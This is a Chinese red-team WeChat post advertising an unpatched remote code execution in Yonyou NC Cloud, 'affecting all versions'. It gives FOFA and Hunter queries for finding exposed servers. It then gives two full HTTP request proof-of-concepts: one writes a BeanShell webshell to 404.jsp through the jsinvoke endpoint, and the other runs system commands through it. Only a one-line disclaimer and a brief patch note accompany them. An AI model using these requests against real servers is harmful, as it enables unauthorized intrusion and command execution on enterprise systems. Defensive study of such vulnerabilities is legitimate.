#  0day！！！用友-NC-Cloud远程代码执行漏洞（全版本通杀）

原创 day哥  [ 月落安全 ](javascript:void\(0\);)

**月落安全** ![]()

微信号 gh_48da38d0bfb5

功能介绍 不定时分享红队实战技巧，最新漏洞利用技巧，红队好用的工具，网安界的趣闻，欢迎加入月落星沉研究室一起交流学习

____

___发表于_

收录于合集 #漏洞 6个

**免责 声明  
**

**月落星沉研究室的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为！！！**  

     说句题外话，这个漏洞我们day哥在去年国护的时候就已经发现了，这来自我们团队day哥的分享，大家多关注月落安全，粉丝越多day哥的创作激情就越澎湃。本公众号会不定时分享红队实战技巧，最新漏洞利用技巧，红队好用的工具，网安界的趣闻，欢迎加入月落星沉研究室一起交流学习。 **0x01漏洞介绍**  
  

    用友NC Cloud大型企业数字化平台，深度应用新一代数字智能技术，完全基于云原生架构，打造开放、互联、融合、智能的一体化云平台，聚焦数智化管理、数智化经营、数智化商业等三大企业数智化转型战略方向，提供涵盖数字营销、财务共享、全球司库、智能制造、敏捷供应链、人才管理、智慧协同等18大解决方案，帮助大型企业全面落地数智化。

     该远程代码执行漏洞可以通过特定接口上传文件，通过上传的webshell执行命令，目前全版本通杀

![]()  
 **0x02资产测绘**  
  

  *   * 

    
    
     FOFA:app="用友-NC-Cloud"Hunter：web.body="uap/rbac"

  

  

![]()  
 **0x03漏洞复现**  
  

  
![]()  

 **  Poc1 上传木马**

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /uapjs/jsinvoke/?action=invoke HTTP/1.1Host: ip:portCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.serverIf-None-Match: W/"1571-1589211696000"If-Modified-Since: Mon, 11 May 2020 15:41:36 GMTConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 247  
    {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/404.jsp"]}

![]()

 **   Poc2 执行命令**

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /404.jsp?error=bsh.Interpreter HTTP/1.1Host: ip:protCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.serverIf-None-Match: W/"1571-1589211696000"If-Modified-Since: Mon, 11 May 2020 15:41:36 GMTConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 96  
    cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())

![]()  

![]()  
  
 **0x04修复建议**  
  

  
1.官方已经发布修复补丁，请进行升级。2.或者进行waf等安全部署拦截恶意字符  

  

本文由月落星沉团队编写，欢迎各位网安工程师加入月落安全研究实验室，一起学习交流讨论！群聊已满的添加Vx：linjialelovejesus，备注进群。（已加入一二三四五群的无需重复加群）  

  
  

![]()

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

